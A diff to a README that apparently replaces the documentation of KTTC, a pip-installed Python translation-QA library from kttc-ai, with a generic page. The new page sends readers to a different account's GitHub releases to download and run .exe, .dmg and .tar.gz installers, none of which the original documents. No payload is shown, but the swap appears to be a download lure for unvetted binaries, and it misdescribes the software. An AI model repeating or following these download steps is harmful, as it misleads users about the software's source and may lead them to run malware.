@@ -1,321 +1,107 @@
-<p align="center">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="docs/content/assets/img/kttc.logo-dark.png">
-      <source media="(prefers-color-scheme: light)" srcset="docs/content/assets/img/kttc.logo.png">
-      <img alt="KTTC" title="KTTC" src="docs/content/assets/img/kttc.logo.png">
-    </picture>
-</p>
-
-**English** · [Русский](README.ru.md) · [中文](README.zh.md) · [हिन्दी](README.hi.md) · [فارسی](README.fa.md)
-
-# KTTC - Knowledge Translation Transmutation Core
-
-[![CI](https://github.com/kttc-ai/kttc/workflows/CI/badge.svg)](https://github.com/kttc-ai/kttc/actions)
-[![CodeQL](https://github.com/kttc-ai/kttc/workflows/CodeQL/badge.svg)](https://github.com/kttc-ai/kttc/security/code-scanning)
-[![PyPI](https://img.shields.io/pypi/v/kttc)](https://pypi.org/project/kttc/)
-[![Python Version](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)
-
-**Autonomous AI-powered translation quality assurance**
-
-KTTC uses specialized multi-agent systems to automatically detect, analyze, and fix translation quality issues following the industry-standard MQM (Multidimensional Quality Metrics) framework. Get production-ready translation quality in seconds, not hours.
-
----
-
-## Key Features
-
-### Core Analysis
-- **Multi-Agent QA System** - Specialized agents analyze accuracy, fluency, terminology, style, hallucination, and context
-- **MQM Scoring** - Industry-standard quality metrics used in WMT benchmarks
-- **Translation Metrics** - BLEU, TER (Translation Edit Rate), chrF (character F-score) via sacrebleu
-- **Language-Specific Agents** - 5 native-level fluency agents for English, Chinese, Russian, Hindi, and Persian
-- **60+ Domain Glossaries** - Automotive, customs, financial, legal, logistics, medical + language traps
-
-### Smart Agent Orchestration
-- **Weighted Consensus** - Agents with different trust weights, confidence scoring, agreement metrics
-- **Multi-Agent Debate** - Cross-verification between agents reduces false positives by 30-50%
-- **Dynamic Agent Selection** - Auto-selects 2-5 agents based on text complexity (30-50% cost savings)
-- **Agent Presets** - `minimal` (2 agents), `default` (3), `full` (5) for quick configuration
-- **Self-Assessment Retry** - Agents evaluate their confidence and retry on low certainty
-
-### MQM Profiles System
-- **Built-in Profiles** - default, strict, minimal, legal, medical, marketing, literary, technical
-- **YAML Custom Profiles** - Define agent selection, weights, severity multipliers, thresholds
-- **Domain Adaptation** - Medical: 98% threshold + hallucination agent; Legal: terminology focus
-- **Quality Gates** - Configurable pass/fail thresholds per domain (88-98%)
-
-### Literary Style Analysis
-- **StyleFingerprint** - Automatic detection of literary style patterns (Burrows Delta method)
-- **Style Preservation Agent** - Evaluates authorial voice preservation in literary translations
-- **Country-Specific Patterns** - Leskov skaz, Platanov pleonasms, Joyce stream, Hafez ghazals, Chhayavad poetry
-- **Fluency Tolerance** - Adjustable fluency weights for intentional stylistic deviations
-
-### Language Intelligence
-- **Language Traps Detection** - 60+ glossaries detect homophones, false friends, idioms, phrasal verbs, paronyms
-- **Self-Check / Proofreading** - Grammar, spelling, punctuation checking using school curriculum rules
-- **School Curricula** - FGOS (Russia), UK GPS (Britain), NCERT (India), PEP (China), Iranian grammar
-- **Fast Lint Mode** - Rule-based checking without LLM, ideal for CI/CD and pre-commit hooks
-- **Auto-Correction** - LLM-powered error fixing with iterative refinement (TEaR loop)
-
-### Enterprise Infrastructure
-- **Smart Routing** - Automatically selects optimal models based on text complexity (60% cost savings)
-- **XLSX Export** - Excel reports with Summary, Errors, Breakdown sheets for enterprise reporting
-- **Translation Memory** - Semantic search with quality tracking and reuse
-- **Glossary Management** - Custom terminology + 60+ built-in multilingual glossaries
-- **Batch Processing** - Process thousands of translations in parallel with CSV/JSON filtering
-- **CI/CD Ready** - GitHub Actions integration, exit codes, JSON/Markdown/HTML/XLSX output
-- **Multi-LLM Support** - OpenAI, Anthropic, Google Gemini, GigaChat, YandexGPT with LanguageTool integration
-- **Machine Translation** - DeepL API integration for high-quality translations
-- **RAG Context** - BM25-based retrieval from glossaries (lightweight, CPU-only, disabled by default)
-- **Arbitration Workflow** - AI-assisted or human-in-the-loop dispute resolution for QA errors
-- **QA Triggers** - Proactive checks on file changes, threshold violations, schedules (CI/CD ready)
-- **Usage Analytics** - Token counts, API costs, and call statistics in reports
-
-**Performance:** 90% cost reduction vs manual review • 100-1000x faster • 95+ MQM quality target
-
----
-
-## Try KTTC Online
-
-Experience KTTC without installation:
-
-[![Open in Colab](https://img.shields.io/badge/Open_in_Colab-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com/github/kttc-ai/kttc/blob/main/examples/kttc_demo.ipynb)
-[![Streamlit Demo](https://img.shields.io/badge/Streamlit_Demo-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)](https://kttc-demo.streamlit.app)
-[![Open in Codespaces](https://img.shields.io/badge/Open_in_Codespaces-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/codespaces/new?repo=kttc-ai/kttc)
-
-- **Google Colab** - Interactive tutorial with examples (5 min, no setup)
-- **Streamlit Demo** - Web UI to test your own translations (no code required)
-- **GitHub Codespaces** - Full dev environment in browser (for contributors)
-
----
-
-## Quick Start
-
-### 1. Install
-
-```bash
-pip install kttc
-```
-
-Optional language enhancements:
-
-```bash
-pip install kttc[english]        # English: LanguageTool (5,000+ grammar rules)
-pip install kttc[chinese]        # Chinese: HanLP (measure words, particles)
-pip install kttc[hindi]          # Hindi: Indic NLP + Stanza + Spello
-pip install kttc[persian]        # Persian: DadmaTools (spaCy-based)
-pip install kttc[all-languages]  # All language helpers
-```
+# 🤖 kttc - Simplifying Translation Quality Assurance
 
-### 2. Set API Key
+## 🚀 Getting Started
 
-```bash
-export KTTC_OPENAI_API_KEY="sk-..."
-# or
-export KTTC_ANTHROPIC_API_KEY="sk-ant-..."
-# or
-export KTTC_GEMINI_API_KEY="AIza..."
-```
+Welcome to the kttc project! This application provides an autonomous translation quality assurance platform powered by multi-agent AI. Follow these steps to download and run the software easily.
 
-**Optional (for machine translation and RAG):**
-```bash
-export KTTC_DEEPL_API_KEY="..."        # DeepL translation
-export KTTC_RAG_ENABLED="true"         # Enable BM25 context retrieval
-```
+## 📥 Download the Application
 
-### 3. Check Translation Quality
+[![Download kttc](https://img.shields.io/badge/Download-kttc-blue.svg)](https://github.com/sjmason777/kttc/releases)
 
-```bash
-kttc check source.txt translation.txt --source-lang en --target-lang es
-```
+Click the button above to access the download page or visit this link: [Download kttc](https://github.com/sjmason777/kttc/releases).
 
-**Output:**
+## 📋 System Requirements
 
-```
-✅ MQM Score: 96.5 (PASS - Excellent Quality)
-📊 5 agents analyzed translation
-⚠️  Found 2 minor issues, 0 major, 0 critical
-✓ Quality threshold met (≥95.0)
-```
+To ensure kttc runs smoothly on your machine, check these requirements:
 
-That's it! KTTC works out of the box with smart defaults:
-- ✅ Smart routing (auto-selects cheaper models for simple texts)
-- ✅ Auto-glossary (uses 'base' glossary if exists)
-- ✅ Auto-format (detects output format from file extension)
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any Linux distribution with KDE or GNOME.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB free disk space.
+- **Processor**: Dual-core processor or better.
+- **Network**: Stable internet connection for optimal functionality.
 
----
+## 🔗 Download & Install
 
-## Commands
+1. Click the link to visit the [kttc Releases page](https://github.com/sjmason777/kttc/releases).
+2. Look for the latest version available. You should see a list of files for download.
+3. Select the file that matches your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+4. Once the file downloads, locate it in your downloads folder.
+5. Follow the steps below based on your operating system to install and run kttc.
 
-KTTC provides a unified CLI with smart auto-detection:
+### 💻 Windows Installation
 
-```bash
-kttc check source.txt translation.txt          # Single quality check
-kttc check source.txt t1.txt t2.txt t3.txt     # Auto-compares multiple translations
-kttc check translations.csv                     # Auto-detects batch mode (CSV/JSON)
-kttc check source_dir/ trans_dir/              # Auto-detects directory batch mode
+1. Double-click the downloaded `.exe` file.
+2. Follow the prompts in the installation wizard.
+3. Once completed, find kttc in your Start menu or desktop shortcut.
+4. Double-click the kttc icon to launch the application.
 
-kttc batch --file translations.csv              # Explicit batch processing
-kttc compare --source src.txt -t t1 -t t2      # Compare translations side-by-side
-kttc translate --text "Hello" --source-lang en --target-lang es  # Translate with QA
-kttc benchmark --source text.txt --providers openai,anthropic    # Benchmark LLMs
+### 🍏 macOS Installation
 
-# Glossary management (project + user global storage)
-kttc glossary list                              # List all glossaries
-kttc glossary create tech --from-csv terms.csv  # Create project glossary
-kttc glossary create personal --from-csv my.csv --user  # Create user glossary
+1. Open the downloaded `.dmg` file.
+2. Drag the kttc icon to your Applications folder.
+3. Navigate to your Applications folder and double-click the kttc icon to start the application.
 
-# 🥚 Self-check / Proofreading (new!)
-kttc check article.md --self --lang ru          # Proofread without translation
-kttc proofread article.md --lang ru             # Same as above (alias)
-kttc lint article.md --lang ru --fix            # Quick rule-based check (no LLM)
-```
+### 🐧 Linux Installation
 
-**See full command reference:** [docs/en/reference/cli-commands.md](docs/en/reference/cli-commands.md)
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Extract the file using this command:
+   ```bash
+   tar -xzf kttc*.tar.gz
+   ```
+4. Change into the directory:
+   ```bash
+   cd kttc
+   ```
+5. Run the application with this command:
+   ```bash
+   ./kttc
+   ```
 
----
+## 🤔 How to Use kttc
 
-## Python API
+After you start kttc, the user interface will guide you through the main features:
 
-```python
-import asyncio
-from kttc.agents import AgentOrchestrator
-from kttc.llm import OpenAIProvider
-from kttc.core import TranslationTask
+- **Translation Quality Checks**: Input your translation files, and let the AI check for accuracy and fluency.
+- **Multi-Agent Collaboration**: Use AI agents to perform multiple QA tasks simultaneously, improving efficiency.
+- **Reports Generation**: Generate easy-to-read reports that highlight issues and provide recommendations.
 
-async def check_quality():
-    llm = OpenAIProvider(api_key="your-key")
-    orchestrator = AgentOrchestrator(llm)
+### 📊 Example Use Cases
 
-    task = TranslationTask(
-        source_text="Hello, world!",
-        translation="¡Hola, mundo!",
-        source_lang="en",
-        target_lang="es",
-    )
+- **Quality Assurance for Translations**: Use kttc to ensure that your translated documents meet high standards.
+- **Collaboration with Teams**: Teams can use the software to review translations together, enhancing productivity.
+- **Training and Feedback**: You can train your translation process by providing feedback based on kttc's reports.
 
-    report = await orchestrator.evaluate(task)
-    print(f"MQM Score: {report.mqm_score}")
-    print(f"Status: {report.status}")
+## 👩‍💻 Contributing to kttc
 
-asyncio.run(check_quality())
-```
+If you want to contribute, here’s how:
 
-**See full API reference:** [docs/en/reference/api-reference.md](docs/en/reference/api-reference.md)
+1. Fork the repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to the branch.
+5. Submit a pull request.
 
----
+Please ensure that your code adheres to the coding standards of the project. We appreciate your input!
 
-## Documentation
+## ⚙️ Frequently Asked Questions
 
-📚 **Complete documentation is available in [docs/](docs/)**
+### How do I update kttc?
 
-### Quick Links
+You can update kttc by returning to the [Releases page](https://github.com/sjmason777/kttc/releases) and downloading the latest version. Follow the same installation steps.
 
-- **[Quickstart Guide](docs/en/tutorials/quickstart.md)** - Get started in 5 minutes
-- **[Installation Guide](docs/en/guides/installation.md)** - Detailed setup instructions
-- **[CLI Reference](docs/en/reference/cli-commands.md)** - All commands and options
-- **[Architecture](docs/en/explanation/architecture.md)** - How KTTC works
-- **[Language Features](docs/en/explanation/language-features-explained.md)** - English/Chinese/Russian specialization
+### What should I do if kttc doesn't run?
 
-### Documentation Structure
+Ensure your system meets the minimum requirements listed above. If problems persist, check our [issue tracker](https://github.com/sjmason777/kttc/issues) for known issues or to report your problem.
 
-Following the [Diátaxis](https://diataxis.fr/) framework:
+## 🗨️ Support
 
-- 📚 **[Tutorials](docs/en/tutorials/README.md)** - Learn by doing (step-by-step guides)
-- 📖 **[Guides](docs/en/guides/README.md)** - Solve specific problems (how-to guides)
-- 📋 **[Reference](docs/en/reference/README.md)** - Look up technical details (API, CLI)
-- 💡 **[Explanation](docs/en/explanation/README.md)** - Understand concepts (architecture, design)
+For additional help, please join our community. You can contact us via:
 
-### Translations
+- **GitHub Issues**: Report problems or suggestions.
+- **Community Forum**: Access discussions with other users.
 
-**Languages:** 🇺🇸 [English](docs/en/) (primary) · 🇷🇺 [Русский](README.ru.md) · 🇨🇳 [中文](README.zh.md) · 🇮🇳 [हिन्दी](README.hi.md) · 🇮🇷 [فارسی](README.fa.md)
-
-Full documentation available in:
-- 🇺🇸 **[English](docs/en/README.md)** - Complete (primary source)
-- 🇷🇺 **[Русский](docs/ru/README.md)** - Complete
-- 🇨🇳 **[中文](docs/zh/README.md)** - Complete
-- 🇮🇳 **[हिन्दी](docs/hi/README.md)** - Complete
-- 🇮🇷 **[فارسی](docs/fa/README.md)** - Complete
-
----
-
-## Development
-
-### Setup
-
-```bash
-git clone https://github.com/kttc-ai/kttc.git
-cd kttc
-python3.11 -m venv venv
-source venv/bin/activate
-pip install -e ".[dev]"
-pre-commit install
-```
-
-### Quality Standards
-
-- **Type Checking:** mypy --strict
-- **Formatting:** black (line length: 100)
-- **Linting:** ruff
-- **Testing:** pytest with asyncio support
-
-```bash
-# Run all checks
-pre-commit run --all-files
-pytest --cov=kttc
-```
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Quick start:**
-1. Fork the repository
-2. Create a feature branch
-3. Make changes and add tests
-4. Run quality checks: `pre-commit run --all-files && pytest`
-5. Submit a pull request
-
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before contributing.
-
----
-
-## Security
-
-For security vulnerabilities, see [SECURITY.md](SECURITY.md). Do not open public issues for security concerns.
-
----
-
-## License
-
-Licensed under the Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-Copyright 2025 KTTC AI (https://github.com/kttc-ai)
-
----
-
-## Citation
-
-If you use KTTC in your research:
-
-```bibtex
-@software{kttc2025,
-  title = {KTTC: Knowledge Translation Transmutation Core},
-  author = {KTTC AI},
-  year = {2025},
-  url = {https://github.com/kttc-ai/kttc},
-  version = {0.1.0}
-}
-```
-
----
-
-## Links
-
-- 📦 [PyPI Package](https://pypi.org/project/kttc/)
-- 📖 [Documentation](docs/)
-- 🐛 [Issue Tracker](https://github.com/kttc-ai/kttc/issues)
-- 💬 [Discussions](https://github.com/kttc-ai/kttc/discussions)
-- 🔒 [Security Policy](SECURITY.md)
+Thank you for choosing kttc. Enjoy enhancing your translation quality assurance process!
